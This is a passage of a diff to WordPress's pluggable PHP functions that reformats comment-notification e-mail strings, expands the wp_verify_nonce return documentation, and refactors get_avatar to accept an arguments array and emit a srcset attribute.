 			$subject = sprintf( __('[%1$s] Pingback: "%2$s"'), $blogname, $post->post_title );
@@ -1401,11 +1445,11 @@ function wp_notify_postauthor( $comment_id, $deprecated = null ) {
 		default: // Comments
 			$notify_message  = sprintf( __( 'New comment on your post "%s"' ), $post->post_title ) . "\r\n";
 			/* translators: 1: comment author, 2: author IP, 3: author domain */
-			$notify_message .= sprintf( __( 'Author: %1$s (IP: %2$s , %3$s)' ), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
+			$notify_message .= sprintf( __( 'Author: %1$s (IP: %2$s, %3$s)' ), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
 			$notify_message .= sprintf( __( 'E-mail: %s' ), $comment->comment_author_email ) . "\r\n";
 			$notify_message .= sprintf( __( 'URL: %s' ), $comment->comment_author_url ) . "\r\n";
 			$notify_message .= sprintf( __( 'Whois: %s' ), "http://whois.arin.net/rest/ip/{$comment->comment_author_IP}" ) . "\r\n";
-			$notify_message .= sprintf( __('Comment: %s' ), $comment->comment_content ) . "\r\n\r\n";
+			$notify_message .= sprintf( __('Comment: %s' ), "\r\n" . $comment->comment_content ) . "\r\n\r\n";
 			$notify_message .= __( 'You can see all comments on this post here:' ) . "\r\n";
 			/* translators: 1: blog name, 2: post title */
 			$subject = sprintf( __('[%1$s] Comment: "%2$s"'), $blogname, $post->post_title );
@@ -1516,25 +1560,27 @@ function wp_notify_moderator($comment_id) {
 		case 'trackback':
 			$notify_message  = sprintf( __('A new trackback on the post "%s" is waiting for your approval'), $post->post_title ) . "\r\n";
 			$notify_message .= get_permalink($comment->comment_post_ID) . "\r\n\r\n";
-			$notify_message .= sprintf( __('Website : %1$s (IP: %2$s , %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
-			$notify_message .= sprintf( __('URL    : %s'), $comment->comment_author_url ) . "\r\n";
+			/* translators: 1: website name, 2: website IP, 3: website hostname */
+			$notify_message .= sprintf( __( 'Website: %1$s (IP: %2$s, %3$s)' ), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
+			$notify_message .= sprintf( __( 'URL: %s' ), $comment->comment_author_url ) . "\r\n";
 			$notify_message .= __('Trackback excerpt: ') . "\r\n" . $comment->comment_content . "\r\n\r\n";
 			break;
 		case 'pingback':
 			$notify_message  = sprintf( __('A new pingback on the post "%s" is waiting for your approval'), $post->post_title ) . "\r\n";
 			$notify_message .= get_permalink($comment->comment_post_ID) . "\r\n\r\n";
-			$notify_message .= sprintf( __('Website : %1$s (IP: %2$s , %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
-			$notify_message .= sprintf( __('URL    : %s'), $comment->comment_author_url ) . "\r\n";
+			/* translators: 1: website name, 2: website IP, 3: website hostname */
+			$notify_message .= sprintf( __( 'Website: %1$s (IP: %2$s, %3$s)' ), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
+			$notify_message .= sprintf( __( 'URL: %s' ), $comment->comment_author_url ) . "\r\n";
 			$notify_message .= __('Pingback excerpt: ') . "\r\n" . $comment->comment_content . "\r\n\r\n";
 			break;
 		default: // Comments
 			$notify_message  = sprintf( __('A new comment on the post "%s" is waiting for your approval'), $post->post_title ) . "\r\n";
 			$notify_message .= get_permalink($comment->comment_post_ID) . "\r\n\r\n";
-			$notify_message .= sprintf( __('Author : %1$s (IP: %2$s , %3$s)'), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
-			$notify_message .= sprintf( __('E-mail : %s'), $comment->comment_author_email ) . "\r\n";
-			$notify_message .= sprintf( __('URL    : %s'), $comment->comment_author_url ) . "\r\n";
-			$notify_message .= sprintf( __('Whois  : http://whois.arin.net/rest/ip/%s'), $comment->comment_author_IP ) . "\r\n";
-			$notify_message .= __('Comment: ') . "\r\n" . $comment->comment_content . "\r\n\r\n";
+			$notify_message .= sprintf( __( 'Author: %1$s (IP: %2$s, %3$s)' ), $comment->comment_author, $comment->comment_author_IP, $comment_author_domain ) . "\r\n";
+			$notify_message .= sprintf( __( 'E-mail: %s' ), $comment->comment_author_email ) . "\r\n";
+			$notify_message .= sprintf( __( 'URL: %s' ), $comment->comment_author_url ) . "\r\n";
+			$notify_message .= sprintf( __( 'Whois: %s' ), "http://whois.arin.net/rest/ip/{$comment->comment_author_IP}" ) . "\r\n";
+			$notify_message .= sprintf( __( 'Comment: %s' ), "\r\n" . $comment->comment_content ) . "\r\n\r\n";
 			break;
 	}
 
@@ -1693,7 +1739,8 @@ if ( !function_exists('wp_verify_nonce') ) :
  *
  * @param string     $nonce  Nonce that was used in the form to verify
  * @param string|int $action Should give context to what is taking place and be the same when nonce was created.
- * @return bool Whether the nonce check passed or failed.
+ * @return false|int False if the nonce is invalid, 1 if the nonce is valid and generated between
+ *                   0-12 hours ago, 2 if the nonce is valid and generated between 12-24 hours ago.
  */
 function wp_verify_nonce( $nonce, $action = -1 ) {
 	$nonce = (string) $nonce;
@@ -2082,123 +2129,144 @@ endif;
 
 if ( !function_exists( 'get_avatar' ) ) :
 /**
- * Retrieve the avatar for a user who provided a user ID or email address.
+ * Retrieve the avatar `<img>` tag for a user, email address, MD5 hash, comment, or post.
  *
  * @since 2.5.0
+ * @since 4.2.0 Optional `$args` parameter added.
  *
- * @param int|string|object $id_or_email A user ID,  email address, or comment object
- * @param int $size Size of the avatar image
- * @param string $default URL to a default image to use if no avatar is available
- * @param string $alt Alternative text to use in image tag. Defaults to blank
- * @return false|string `<img>` tag for the user's avatar.
-*/
-function get_avatar( $id_or_email, $size = '96', $default = '', $alt = false ) {
-	if ( ! get_option('show_avatars') )
+ * @param mixed $id_or_email The Gravatar to retrieve. Accepts a user_id, gravatar md5 hash,
+ *                           user email, WP_User object, WP_Post object, or comment object.
+ * @param int    $size       Optional. Height and width of the avatar image file in pixels. Default 96.
+ * @param string $default    Optional. URL for the default image or a default type. Accepts '404'
+ *                           (return a 404 instead of a default image), 'retro' (8bit), 'monsterid'
+ *                           (monster), 'wavatar' (cartoon face), 'indenticon' (the "quilt"),
+ *                           'mystery', 'mm', or 'mysterman' (The Oyster Man), 'blank' (transparent GIF),
+ *                           or 'gravatar_default' (the Gravatar logo). Default is the value of the
+ *                           'avatar_default' option, with a fallback of 'mystery'.
+ * @param string $alt        Optional. Alternative text to use in &lt;img&gt; tag. Default empty.
+ * @param array  $args       {
+ *     Optional. Extra arguments to retrieve the avatar.
+ *
+ *     @type int          $height        Display height of the avatar in pixels. Defaults to $size.
+ *     @type int          $width         Display width of the avatar in pixels. Defaults to $size.
+ *     @type bool         $force_default Whether to always show the default image, never the Gravatar. Default false.
+ *     @type string       $rating        What rating to display avatars up to. Accepts 'G', 'PG', 'R', 'X', and are
+ *                                       judged in that order. Default is the value of the 'avatar_rating' option.
+ *     @type string       $scheme        URL scheme to use. See set_url_scheme() for accepted values.
+ *                                       Default null.
+ *     @type array|string $class         Array or string of additional classes to add to the &lt;img&gt; element.
+ *                                       Default null.
+ *     @type bool         $force_display Whether to always show the avatar - ignores the show_avatars option.
+ *                                       Default false.
+ *     @type string       $extra_attr    HTML attributes to insert in the IMG element. Is not sanitized. Default empty.
+ * }
+ * @return false|string `<img>` tag for the user's avatar. False on failure.
+ */
+function get_avatar( $id_or_email, $size = 96, $default = '', $alt = '', $args = null ) {
+	$defaults = array(
+		// get_avatar_data() args.
+		'size'          => 96,
+		'height'        => null,
+		'width'         => null,
+		'default'       => get_option( 'avatar_default', 'mystery' ),
+		'force_default' => false,
+		'rating'        => get_option( 'avatar_rating' ),
+		'scheme'        => null,
+		'alt'           => '',
+		'class'         => null,
+		'force_display' => false,
+		'extra_attr'    => '',
+	);
+
+	if ( empty( $args ) ) {
+		$args = array();
+	}
+
+	$args['size']    = (int) $size;
+	$args['default'] = $default;
+	$args['alt']     = $alt;
+
+	$args = wp_parse_args( $args, $defaults );
+
+	if ( empty( $args['height'] ) ) {
+		$args['height'] = $args['size'];
+	}
+	if ( empty( $args['width'] ) ) {
+		$args['width'] = $args['size'];
+	}
+
+	/**
+	 * Filter whether to retrieve the avatar URL early.
+	 *
+	 * Passing a non-null value will effectively short-circuit get_avatar(), passing
+	 * the value through the {@see 'pre_get_avatar'} filter and returning early.
+	 *
+	 * @since 4.2.0
+	 *
+	 * @param string            $avatar      HTML for the user's avatar. Default null.
+	 * @param int|object|string $id_or_email A user ID, email address, or comment object.
+	 * @param array             $args        Arguments passed to get_avatar_url(), after processing.
+	 */
+	$avatar = apply_filters( 'pre_get_avatar', null, $id_or_email, $args );
+
+	if ( ! is_null( $avatar ) ) {
+		/** This filter is documented in wp-includes/pluggable.php */
+		return apply_filters( 'get_avatar', $avatar, $id_or_email, $args['size'], $args['default'], $args['alt'], $args );
+	}
+
+	if ( ! $args['force_display'] && ! get_option( 'show_avatars' ) ) {
 		return false;
+	}
 
-	if ( false === $alt)
-		$safe_alt = '';
-	else
-		$safe_alt = esc_attr( $alt );
+	$url2x = get_avatar_url( $id_or_email, array_merge( $args, array( 'size' => $args['size'] * 2 ) ) );
 
-	if ( !is_numeric($size) )
-		$size = '96';
+	$args = get_avatar_data( $id_or_email, $args );
 
-	$email = '';
-	if ( is_numeric($id_or_email) ) {
-		$id = (int) $id_or_email;
-		$user = get_userdata($id);
-		if ( $user )
-			$email = $user->user_email;
-	} elseif ( is_object($id_or_email) ) {
-		// No avatar for pingbacks or trackbacks
+	$url = $args['url'];
 
-		/**
-		 * Filter the list of allowed comment types for retrieving avatars.
-		 *
-		 * @since 3.0.0
-		 *
-		 * @param array $types An array of content types. Default only contains 'comment'.
-		 */
-		$allowed_comment_types = apply_filters( 'get_avatar_comment_types', array( 'comment' ) );
-		if ( ! empty( $id_or_email->comment_type ) && ! in_array( $id_or_email->comment_type, (array) $allowed_comment_types ) )
-			return false;
+	if ( ! $url || is_wp_error( $url ) ) {
+        return false;
+	}
 
-		if ( ! empty( $id_or_email->user_id ) ) {
-			$id = (int) $id_or_email->user_id;
-			$user = get_userdata($id);
-			if ( $user )
-				$email = $user->user_email;
+	$class = array( 'avatar', 'avatar-' . (int) $args['size'], 'photo' );
+
+	if ( ! $args['found_avatar'] || $args['force_default'] ) {
+        $class[] = 'avatar-default';
+	}
+
+	if ( $args['class'] ) {
+		if ( is_array( $args['class'] ) ) {
+			$class = array_merge( $class, $args['class'] );
+		} else {
+			$class[] = $args['class'];
 		}
-
-		if ( ! $email && ! empty( $id_or_email->comment_author_email ) )
-			$email = $id_or_email->comment_author_email;
-	} else {
-		$email = $id_or_email;
 	}
 
-	if ( empty($default) ) {
-		$avatar_default = get_option('avatar_default');
-		if ( empty($avatar_default) )
-			$default = 'mystery';
-		else
-			$default = $avatar_default;
-	}
-
-	if ( !empty($email) )
-		$email_hash = md5( strtolower( trim( $email ) ) );
-
-	if ( is_ssl() ) {
-		$host = 'https://secure.gravatar.com';
-	} else {
-		if ( !empty($email) )
-			$host = sprintf( "http://%d.gravatar.com", ( hexdec( $email_hash[0] ) % 2 ) );
-		else
-			$host = 'http://0.gravatar.com';
-	}
-
-	if ( 'mystery' == $default )
-		$default = "$host/avatar/ad516503a11cd5ca435acc9bb6523536?s={$size}"; // ad516503a11cd5ca435acc9bb6523536 == md5('unknown@gravatar.com')
-	elseif ( 'blank' == $default )
-		$default = $email ? 'blank' : includes_url( 'images/blank.gif' );
-	elseif ( !empty($email) && 'gravatar_default' == $default )
-		$default = '';
-	elseif ( 'gravatar_default' == $default )
-		$default = "$host/avatar/?s={$size}";
-	elseif ( empty($email) )
-		$default = "$host/avatar/?d=$default&amp;s={$size}";
-	elseif ( strpos($default, 'http://') === 0 )
-		$default = add_query_arg( 's', $size, $default );
-
-	if ( !empty($email) ) {
-		$out = "$host/avatar/";
-		$out .= $email_hash;
-		$out .= '?s='.$size;
-		$out .= '&amp;d=' . urlencode( $default );
-
-		$rating = get_option('avatar_rating');
-		if ( !empty( $rating ) )
-			$out .= "&amp;r={$rating}";
-
-		$out = str_replace( '&#038;', '&amp;', esc_url( $out ) );
-		$avatar = "<img alt='{$safe_alt}' src='{$out}' class='avatar avatar-{$size} photo' height='{$size}' width='{$size}' />";
-	} else {
-		$out = esc_url( $default );
-		$avatar = "<img alt='{$safe_alt}' src='{$out}' class='avatar avatar-{$size} photo avatar-default' height='{$size}' width='{$size}' />";
-	}
+	$avatar = sprintf(
+		"<img alt='%s' src='%s' srcset='%s' class='%s' height='%d' width='%d' %s/>",
+		esc_attr( $args['alt'] ),
+		esc_url( $url ),
+		esc_attr( "$url2x 2x" ),
+		esc_attr( join( ' ', $class ) ),
+		(int) $args['height'],
+		(int) $args['width'],
+		$args['extra_attr']
+	);
 
 	/**
 	 * Filter the avatar to retrieve.
 	 *
 	 * @since 2.5.0
+	 * @since 4.2.0 The `$args` parameter was added.
 	 *
-	 * @param string            $avatar      Image tag for the user's avatar.
+	 * @param string            $avatar      &lt;img&gt; tag for the user's avatar.
 	 * @param int|object|string $id_or_email A user ID, email address, or comment object.
 	 * @param int               $size        Square avatar width and height in pixels to retrieve.
 	 * @param string            $alt         Alternative text to use in the avatar image tag.
 	 *                                       Default empty.
+	 * @param array             $args        Arguments passed to get_avatar_data(), after processing.
 	 */
-	return apply_filters( 'get_avatar', $avatar, $id_or_email, $size, $default, $alt );
+	return apply_filters( 'get_avatar', $avatar, $id_or_email, $args['size'], $args['default'], $args['alt'], $args );
 }
 endif;
 
